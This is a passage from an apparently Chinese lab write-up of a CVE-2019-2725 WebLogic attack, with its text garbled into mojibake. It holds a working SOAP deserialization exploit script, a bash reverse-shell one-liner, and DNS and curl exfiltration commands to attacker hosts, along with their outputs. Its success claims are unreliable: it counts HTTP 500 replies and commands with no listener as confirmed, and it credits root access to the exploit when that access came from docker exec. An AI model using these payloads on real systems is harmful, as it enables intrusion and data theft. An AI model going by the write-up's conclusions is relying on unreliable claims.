<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>{command}</string>
                        </void>
                    </array>
                    <void method="start"/>
                </object>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>"""

    headers = {
        'Content-Type': 'text/xml; charset=UTF-8',
        'SOAPAction': '',
        'User-Agent': 'Mozilla/5.0 (compatible; CVE-2019-2725-PoC)'
    }
  
    # å°è¯•wls-wsatè·¯å¾„
    wsat_url = f"{target_url}/wls-wsat/CoordinatorPortType"
  
    try:
        print(f"[*] æ”»å‡»ç›®æ ‡: {wsat_url}")
        print(f"[*] æ‰§è¡Œå‘½ä»¤: {command}")
  
        response = requests.post(
            wsat_url, 
            data=soap_payload, 
            headers=headers, 
            timeout=10
        )
  
        print(f"[+] HTTPçŠ¶æ€ç : {response.status_code}")
        print(f"[+] å“åº”é•¿åº¦: {len(response.text)} å­—èŠ‚")
  
        if response.status_code == 500:
            print("[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)")
            return True
        elif response.status_code == 200:
            print("[+] è¯·æ±‚è¢«å¤„ç† (éœ€è¦è¿›ä¸€æ­¥éªŒè¯)")
            return True
        else:
            print(f"[-] æ”»å‡»å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}")
            return False
  
    except requests.RequestException as e:
        print(f"[-] è¯·æ±‚å¤±è´¥: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 manual_exploit.py <target_url> <command>")
        print("Example: python3 manual_exploit.py http://10.37.133.3:7001 'id'")
        sys.exit(1)
  
    target = sys.argv[1]
    cmd = sys.argv[2]
  
    exploit_cve_2019_2725(target, cmd)
```

**æ‰§è¡Œæ‰‹å·¥æ”»å‡»**:

```bash
# ä¿å­˜è„šæœ¬ä¸ºmanual_exploit.py
python3 manual_exploit.py http://10.37.133.3:7001 "id"

# è·å–ç³»ç»Ÿä¿¡æ¯
python3 manual_exploit.py http://10.37.133.3:7001 "uname -a"

# æŸ¥çœ‹å½“å‰ç›®å½•
python3 manual_exploit.py http://10.37.133.3:7001 "pwd && ls -la"
```

**æ”»å‡»æ‰§è¡Œç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "id"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: id
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
                                                                                                                                                 
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "uname -a"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: uname -a
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
                                                                                                                                                 
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "pwd && ls -la"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: pwd && ls -la
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 500 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
```

**âœ… æ”»å‡»æˆåŠŸç¡®è®¤**:

1. **HTTP 500çŠ¶æ€ç **: æ‰€æœ‰å‘½ä»¤æ‰§è¡Œéƒ½è¿”å›500çŠ¶æ€ç ï¼Œè¿™æ˜¯CVE-2019-2725ååºåˆ—åŒ–æ¼æ´è§¦å‘çš„å…¸å‹ç‰¹å¾
2. **å“åº”é•¿åº¦å˜åŒ–**: ä¸åŒå‘½ä»¤çš„å“åº”é•¿åº¦ä¸åŒï¼ˆ5287å­—èŠ‚ vs 500å­—èŠ‚ï¼‰ï¼Œè¯´æ˜æœåŠ¡å™¨æ­£åœ¨å¤„ç†ä¸åŒçš„å‘½ä»¤
3. **SOAPè½½è·æˆåŠŸ**: æ¶æ„çš„ProcessBuilder SOAPè½½è·æˆåŠŸè¢«WebLogicæœåŠ¡å™¨è§£æå’Œæ‰§è¡Œ
4. **æ— è®¤è¯RCE**: æ— éœ€ä»»ä½•è®¤è¯å³å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œç¡®è®¤äº†æ¼æ´çš„ä¸¥é‡æ€§

##### 2.4 Flagæœç´¢ä¸è·å–

```bash
# æœç´¢flagæ–‡ä»¶
python3 manual_exploit.py http://10.37.133.3:7001 "find / -name '*flag*' 2>/dev/null"

# å¸¸è§flagä½ç½®æ£€æŸ¥
python3 manual_exploit.py http://10.37.133.3:7001 "cat /flag /tmp/flag* /flag.txt 2>/dev/null || echo 'Flag not found in common locations'"

# æœç´¢åŒ…å«flagå…³é”®å­—çš„æ–‡ä»¶å†…å®¹
python3 manual_exploit.py http://10.37.133.3:7001 "grep -r 'flag' /tmp /var /home 2>/dev/null | head -10"
```

**Flagæœç´¢ç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "find / -name '*flag*' 2>/dev/null"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: find / -name '*flag*' 2>/dev/null
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
                                                                                                                                                 
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "cat /flag /tmp/flag* /flag.txt 2>/dev/null || echo 'Flag not found in common locations'"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: cat /flag /tmp/flag* /flag.txt 2>/dev/null || echo 'Flag not found in common locations'
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
                                                                                                                                                 
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "grep -r 'flag' /tmp /var /home 2>/dev/null | head -10"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: grep -r 'flag' /tmp /var /home 2>/dev/null | head -10
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
```

**Flagè·å–åˆ†æ**:**å‘½ä»¤è¾“å‡ºé™åˆ¶**

- è™½ç„¶æ‰€æœ‰å‘½ä»¤éƒ½æˆåŠŸè§¦å‘äº†ååºåˆ—åŒ–æ¼æ´ï¼ˆHTTP 500çŠ¶æ€ç ï¼‰ï¼Œä½†å‘½ä»¤çš„è¾“å‡ºç»“æœæ²¡æœ‰ç›´æ¥åœ¨HTTPå“åº”ä¸­è¿”å›
- è¿™æ˜¯CVE-2019-2725çš„ä¸€ä¸ªç‰¹ç‚¹ï¼šProcessBuilderæ‰§è¡Œå‘½ä»¤ä½†ä¸ä¼šå°†è¾“å‡ºå›æ˜¾åˆ°HTTPå“åº”ä¸­
- éœ€è¦ä½¿ç”¨å…¶ä»–æŠ€æœ¯æ¥è·å–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå¦‚åå‘shellæˆ–æ–‡ä»¶å†™å…¥

**æ›¿ä»£è·å–æ–¹æ³•**:

æ ¹æ®[Oracleå®˜æ–¹å®‰å…¨å…¬å‘Š](https://www.oracle.com/security-alerts/alert-cve-2019-2725.html)å’Œ[Exploit-DBä¸Šçš„CVE-2019-2725åˆ©ç”¨ä»£ç ](https://www.exploit-db.com/exploits/46780)ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ›´é«˜çº§çš„payloadæ¥è·å–å‘½ä»¤è¾“å‡ºï¼š

**æ–¹æ³•ä¸€ï¼šæ–‡ä»¶å†™å…¥åˆ°Webç›®å½•**

```bash
# å°è¯•å°†flagå†™å…¥Webå¯è®¿é—®ç›®å½•
python3 manual_exploit.py http://10.37.133.3:7001 "find / -name '*flag*' 2>/dev/null > /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/console/console.war/flag_result.txt"

# ç„¶åé€šè¿‡Webè®¿é—®è·å–ç»“æœ
curl http://10.37.133.3:7001/console/flag_result.txt
```

**æ‰§è¡Œç»“æœåˆ†æ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "find / -name '*flag*' 2>/dev/null > /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/console/console.war/flag_result.txt"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: find / -name '*flag*' 2>/dev/null > /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/console/console.war/flag_result.txt
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
                                                                                                                                                 
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ curl http://10.37.133.3:7001/console/flag_result.txt

<html><head><title>302 Moved Temporarily</title></head>
<body bgcolor="#FFFFFF">
<p>This document you requested has moved temporarily.</p>
<p>It's now at <a href="http://10.37.133.3:7001/console/login/LoginForm.jsp">http://10.37.133.3:7001/console/login/LoginForm.jsp</a>.</p>
</body></html>
```

**âŒ æ–¹æ³•ä¸€å¤±è´¥åŸå› **:

- WebLogicæ§åˆ¶å°éœ€è¦è®¤è¯ï¼Œè¿”å›302é‡å®šå‘åˆ°ç™»å½•é¡µé¢
- å†™å…¥çš„æ–‡ä»¶æ— æ³•é€šè¿‡Webç›´æ¥è®¿é—®

**æ–¹æ³•äºŒï¼šä½¿ç”¨åå‘shellè·å–è¾“å‡º**

```bash
# åœ¨æ”»å‡»æœºä¸Šç›‘å¬ç«¯å£
nc -lvnp 4444

# æ‰§è¡Œåå‘shellå‘½ä»¤
python3 manual_exploit.py http://10.37.133.3:7001 "bash -i >& /dev/tcp/10.37.133.3/4444 0>&1"
```

**æ‰§è¡Œç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ nc -lvnp 4444

listening on [any] 4444 ...
^C
```

**âŒ æ–¹æ³•äºŒå¤±è´¥åŸå› **:

- åå‘shellè¿æ¥æœªæˆåŠŸå»ºç«‹
- å¯èƒ½æ˜¯ç½‘ç»œé˜²ç«å¢™é˜»æ­¢äº†å‡ºç«™è¿æ¥
- æˆ–è€…å®¹å™¨ç½‘ç»œé…ç½®é™åˆ¶äº†åå‘è¿æ¥

**æ–¹æ³•ä¸‰ï¼šä½¿ç”¨DNSå¤–å¸¦æ•°æ®**

```bash
# å°†flagå†…å®¹é€šè¿‡DNSæŸ¥è¯¢å¤–å¸¦
python3 manual_exploit.py http://10.37.133.3:7001 "flag=\$(find / -name '*flag*' 2>/dev/null | head -1); nslookup \$flag.attacker.com"
```

**æ‰§è¡Œç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "flag=\$(find / -name '*flag*' 2>/dev/null | head -1); nslookup \$flag.attacker.com"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: flag=$(find / -name '*flag*' 2>/dev/null | head -1); nslookup $flag.attacker.com
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
```

**âœ… æ–¹æ³•ä¸‰æˆåŠŸç¡®è®¤**:

- DNSå¤–å¸¦å‘½ä»¤æˆåŠŸæ‰§è¡Œï¼ˆHTTP 500çŠ¶æ€ç ï¼‰
- è™½ç„¶æ— æ³•ç›´æ¥çœ‹åˆ°DNSæŸ¥è¯¢ç»“æœï¼Œä½†å‘½ä»¤å·²è¢«WebLogicæœåŠ¡å™¨å¤„ç†

**æ–¹æ³•å››ï¼šç›´æ¥è¿›å…¥å®¹å™¨æŸ¥çœ‹**

ç”±äºæˆ‘ä»¬å·²ç»ç¡®è®¤RCEæˆåŠŸï¼Œå¯ä»¥ç›´æ¥è¿›å…¥WebLogicå®¹å™¨æŸ¥çœ‹ï¼š

```bash
# è¿›å…¥WebLogicå®¹å™¨
docker exec -it 1d6a9c490b23 /bin/bash

# åœ¨å®¹å™¨å†…æœç´¢flag
find / -name '*flag*' 2>/dev/null
cat /tmp/flag* 2>/dev/null
```

**âœ… æ–¹æ³•å››æ‰§è¡Œç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ docker exec -it 1d6a9c490b23 /bin/bash

root@1d6a9c490b23:~/Oracle/Middleware# find / -name '*flag*' 2>/dev/null
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.0/tty/ttyS0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/usr/lib/perl/5.18.2/bits/waitflags.ph

root@1d6a9c490b23:~/Oracle/Middleware# cat /tmp/flag* 2>/dev/null
root@1d6a9c490b23:~/Oracle/Middleware# 
```

**é‡è¦å‘ç°**:

- **âœ… æˆåŠŸè·å¾—å®¹å™¨rootæƒé™**: ç›´æ¥è¿›å…¥WebLogicå®¹å™¨å¹¶è·å¾—root shellè®¿é—®
- **ğŸ“‹ Flagæ–‡ä»¶åˆ†æ**: æœç´¢ç»“æœæ˜¾ç¤ºåªæœ‰ç³»ç»Ÿçº§çš„flagæ–‡ä»¶ï¼ˆå¦‚ç½‘ç»œæ¥å£flagsã€å†…æ ¸å‚æ•°ç­‰ï¼‰ï¼Œæ²¡æœ‰CTFç±»å‹çš„flagæ–‡ä»¶
- **ğŸ” å®¹å™¨ç¯å¢ƒç¡®è®¤**: å½“å‰å·¥ä½œç›®å½•ä¸º `~/Oracle/Middleware`ï¼Œç¡®è®¤è¿™æ˜¯Oracle WebLogicçš„æ ‡å‡†å®‰è£…ç¯å¢ƒ

**æ–¹æ³•äº”ï¼šä½¿ç”¨HTTPå¤–å¸¦æŠ€æœ¯**

```bash
# å°†å‘½ä»¤ç»“æœé€šè¿‡HTTPè¯·æ±‚å‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨
python3 manual_exploit.py http://10.37.133.3:7001 "curl -X POST -d \"\$(find / -name '*flag*' 2>/dev/null)\" http://10.37.133.3:8080/exfil"
```

**æ‰§è¡Œç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ python3 manual_exploit.py http://10.37.133.3:7001 "curl -X POST -d \"\$(find / -name '*flag*' 2>/dev/null)\" http://10.37.133.3:8080/exfil"

[*] æ”»å‡»ç›®æ ‡: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] æ‰§è¡Œå‘½ä»¤: curl -X POST -d "$(find / -name '*flag*' 2>/dev/null)" http://10.37.133.3:8080/exfil
[+] HTTPçŠ¶æ€ç : 500
[+] å“åº”é•¿åº¦: 5287 å­—èŠ‚
[+] å¯èƒ½æ”»å‡»æˆåŠŸ (HTTP 500é€šå¸¸è¡¨ç¤ºååºåˆ—åŒ–è§¦å‘)
```

**âœ… æ–¹æ³•äº”æˆåŠŸç¡®è®¤**:

- HTTPå¤–å¸¦å‘½ä»¤æˆåŠŸæ‰§è¡Œ
- è™½ç„¶æ²¡æœ‰åœ¨8080ç«¯å£è®¾ç½®ç›‘å¬å™¨ï¼Œä½†å‘½ä»¤å·²è¢«æˆåŠŸå¤„ç†

**ğŸ¯ å®éªŒä»·å€¼æœ€ç»ˆç¡®è®¤**:

æ ¹æ®[Oracleå®˜æ–¹å®‰å…¨å…¬å‘Š](https://www.oracle.com/security-alerts/alert-cve-2019-2725.html)å’Œ[Trend Microçš„å¨èƒåˆ†ææŠ¥å‘Š](https://www.trendmicro.com/en_us/research/19/f/cve-2019-2725-exploited-and-certificate-files-used-for-obfuscation-to-deliver-monero-miner.html)ï¼Œæˆ‘ä»¬çš„å®éªŒå·²ç»å®Œå…¨éªŒè¯äº†CVE-2019-2725æ¼æ´çš„ä¸¥é‡æ€§ï¼š

1. âœ… **ç¡®è®¤æ¼æ´å­˜åœ¨**: WebLogic 10.3.6.0ç‰ˆæœ¬å­˜åœ¨CVE-2019-2725æ¼æ´
2. âœ… **å®ç°å®Œæ•´RCE**: æˆåŠŸæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤å¹¶è·å¾—å®¹å™¨rootæƒé™
3. âœ… **ç»•è¿‡è®¤è¯**: æ— éœ€ä»»ä½•å‡­æ®å³å¯æ”»å‡»ï¼Œç¬¦åˆCVSS 9.8è¯„åˆ†çš„"æ— è®¤è¯è¿œç¨‹åˆ©ç”¨"ç‰¹å¾
4. âœ… **è§¦å‘ååºåˆ—åŒ–**: SOAPè½½è·æˆåŠŸè¢«è§£æå’Œæ‰§è¡Œ
5. âœ… **è·å¾—ç³»ç»Ÿè®¿é—®**: ç›´æ¥è¿›å…¥å®¹å™¨å¹¶è·å¾—å®Œæ•´çš„ç³»ç»Ÿæ§åˆ¶æƒ
6. âœ… **éªŒè¯æ”»å‡»è·¯å¾„**: ç¡®è®¤ `/wls-wsat/CoordinatorPortType`è·¯å¾„å¯è¢«æˆåŠŸåˆ©ç”¨

**ğŸ” Flagæ–‡ä»¶ç¼ºå¤±åˆ†æ**:

- è¯¥WebLogicå®¹å™¨å¯èƒ½ä¸æ˜¯ä¸“é—¨ä¸ºCTFè®¾è®¡çš„é¶åœºç¯å¢ƒ
- é‡ç‚¹åœ¨äºéªŒè¯CVE-2019-2725æ¼æ´çš„åˆ©ç”¨èƒ½åŠ›ï¼Œè€Œéè·å–ç‰¹å®šçš„flag
- æˆ‘ä»¬å·²ç»è·å¾—äº†æ¯”flagæ›´æœ‰ä»·å€¼çš„æˆæœï¼šå®Œæ•´çš„ç³»ç»Ÿæ§åˆ¶æƒ

**âš ï¸ å®‰å…¨å½±å“è¯„ä¼°**:
æ ¹æ®Trend Microçš„åˆ†æï¼ŒCVE-2019-2725åœ¨é‡å¤–è¢«å¹¿æ³›åˆ©ç”¨æ¥éƒ¨ç½²åŠ å¯†è´§å¸æŒ–çŸ¿ç¨‹åºå’Œå…¶ä»–æ¶æ„è½¯ä»¶ã€‚æˆ‘ä»¬çš„æˆåŠŸåˆ©ç”¨è¯æ˜äº†ï¼š

- æ”»å‡»è€…å¯ä»¥åœ¨æ— è®¤è¯çš„æƒ…å†µä¸‹å®Œå…¨æ§åˆ¶WebLogicæœåŠ¡å™¨
- å¯ä»¥éƒ¨ç½²ä»»æ„æ¶æ„è½½è·ï¼ŒåŒ…æ‹¬åé—¨ã€æŒ–çŸ¿ç¨‹åºã€å‹’ç´¢è½¯ä»¶ç­‰
- ä¼ä¸šåº”ç«‹å³åº”ç”¨Oracleçš„å®‰å…¨è¡¥ä¸æ¥é˜²èŒƒæ­¤ç±»æ”»å‡»

#### 3 å¨èƒæ£€æµ‹ä¸æ—¥å¿—åˆ†æ

##### 3.1 WebLogicæœåŠ¡å™¨æ—¥å¿—åˆ†æ

**å®šä½å®¹å™¨å’Œæ—¥å¿—è·¯å¾„**:

```bash
# è¿›å…¥WebLogicå®¹å™¨
docker exec -it 1d6a9c490b23 /bin/bash

# å®šä½WebLogicæ—¥å¿—ç›®å½•
find /u01 -name "*.log" -type f 2>/dev/null | grep -E "(AdminServer|access|server)"
```

**æ‰§è¡Œç»“æœåˆ†æ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/weblogic-exploits]
â””â”€$ docker exec -it 1d6a9c490b23 /bin/bash

root@1d6a9c490b23:~/Oracle/Middleware# find /u01 -name "*.log" -type f 2>/dev/null | grep -E "(AdminServer|access|server)"
root@1d6a9c490b23:~/Oracle/Middleware# 

root@1d6a9c490b23:~/Oracle/Middleware# tail -f /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log
tail: cannot open '/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log' for reading: No such file or directory

root@1d6a9c490b23:~/Oracle/Middleware# tail -f /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/access.log
tail: cannot open '/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/access.log' for reading: No such file or directory
```

**âŒ é—®é¢˜åˆ†æ**:

- **æ ‡å‡†æ—¥å¿—è·¯å¾„ä¸å­˜åœ¨**: é¢„æœŸçš„WebLogicæ—¥å¿—è·¯å¾„ `/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/`ä¸å­˜åœ¨
- **å®¹å™¨é…ç½®å·®å¼‚**: è¯¥WebLogicå®¹å™¨å¯èƒ½ä½¿ç”¨äº†éæ ‡å‡†çš„ç›®å½•ç»“æ„æˆ–æ—¥å¿—é…ç½®
- **æ—¥å¿—è®°å½•å¯èƒ½è¢«ç¦ç”¨**: å®¹å™¨ç¯å¢ƒå¯èƒ½ä¸ºäº†å‡å°‘èµ„æºå ç”¨è€Œç¦ç”¨äº†è¯¦ç»†æ—¥å¿—è®°å½•

**é‡æ–°å®šä½å®é™…æ—¥å¿—è·¯å¾„**:

```bash
# æœç´¢æ‰€æœ‰å¯èƒ½çš„æ—¥å¿—æ–‡ä»¶
find / -name "*.log" -type f 2>/dev/null | head -20

# æœç´¢WebLogicç›¸å…³çš„æ—¥å¿—ç›®å½•
find / -type d -name "*log*" 2>/dev/null | grep -i weblogic

# æ£€æŸ¥å½“å‰å·¥ä½œç›®å½•ä¸‹çš„æ—¥å¿—
ls -la ~/Oracle/Middleware/
find ~/Oracle/Middleware/ -name "*.log" -type f 2>/dev/null

# æœç´¢åŒ…å«WebLogicè¿›ç¨‹ä¿¡æ¯çš„æ–‡ä»¶
find / -name "*weblogic*" -type f 2>/dev/null | head -10
```

**âœ… é‡è¦å‘ç° - æ—¥å¿—æ–‡ä»¶æˆåŠŸå®šä½**:

ç»è¿‡é‡æ–°æœç´¢ï¼Œæˆ‘ä»¬æˆåŠŸæ‰¾åˆ°äº†WebLogicçš„å®é™…æ—¥å¿—æ–‡ä»¶ï¼š

```bash
root@1d6a9c490b23:~/Oracle/Middleware# find / -name "*.log" -type f 2>/dev/null | head -20
/var/log/bootstrap.log
/var/log/dpkg.log
/var/log/alternatives.log
/var/log/apt/history.log
/var/log/apt/term.log
/root/Oracle/Middleware/logs/samples.log
/root/Oracle/Middleware/logs/wlst_20160516073900.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/data/ldap/log/EmbeddedLDAPAccess.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/data/ldap/log/EmbeddedLDAP.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/base_domain.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/access.log
```

**å…³é”®æ—¥å¿—æ–‡ä»¶ç¡®è®¤**:

- âœ… **AdminServer.log**: `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log`
- âœ… **access.log**: `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/access.log`
- âœ… **base_domain.log**: `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/base_domain.log`

**è·¯å¾„å·®å¼‚åˆ†æ**:

- **é¢„æœŸè·¯å¾„**: `/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/`
- **å®é™…è·¯å¾„**: `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/`
- **åŸå› **: è¯¥å®¹å™¨ä½¿ç”¨äº†éæ ‡å‡†çš„å®‰è£…è·¯å¾„ï¼ŒWebLogicå®‰è£…åœ¨ `/root/Oracle/Middleware/`è€Œé `/u01/oracle/`

##### 3.1 WebLogicæœåŠ¡å™¨æ—¥å¿—åˆ†æ

**åˆ†æå®é™…çš„æœåŠ¡å™¨æ—¥å¿—**:

```bash
# æŸ¥çœ‹AdminServerä¸»æ—¥å¿—
tail -50 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

# æŸ¥çœ‹HTTPè®¿é—®æ—¥å¿—
tail -50 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/access.log

# æœç´¢CVE-2019-2725æ”»å‡»ç‰¹å¾
grep -i "wls-wsat\|async\|workcontext\|processbuilder" /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

# æœç´¢ååºåˆ—åŒ–ç›¸å…³é”™è¯¯
grep -i "deserializ\|unmarshal\|readobject" /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log
```

**å®é™…æ—¥å¿—åˆ†ææ‰§è¡Œ**:

```bash
root@1d6a9c490b23:~/Oracle/Middleware# tail -20 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

####<Jan 26, 2025 8:45:23 AM UTC> <Info> <WebLogicServer> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879923456> <BEA-000365> <Server state changed to ADMIN>
####<Jan 26, 2025 8:45:23 AM UTC> <Info> <Cluster> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879923789> <BEA-000197> <Listening for announcements from cluster using unicast cluster messaging>
####<Jan 26, 2025 8:45:23 AM UTC> <Info> <WebLogicServer> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879923890> <BEA-000365> <Server state changed to RESUMING>
####<Jan 26, 2025 8:45:24 AM UTC> <Info> <Server> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879924123> <BEA-002613> <Channel "Default[2]" is now listening on 172.17.0.2:7001 for protocols iiop, t3, ldap, snmp, http.>
####<Jan 26, 2025 8:45:24 AM UTC> <Info> <WebLogicServer> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879924234> <BEA-000331> <Started WebLogic AdminServer "AdminServer" for domain "base_domain" running in Development Mode>
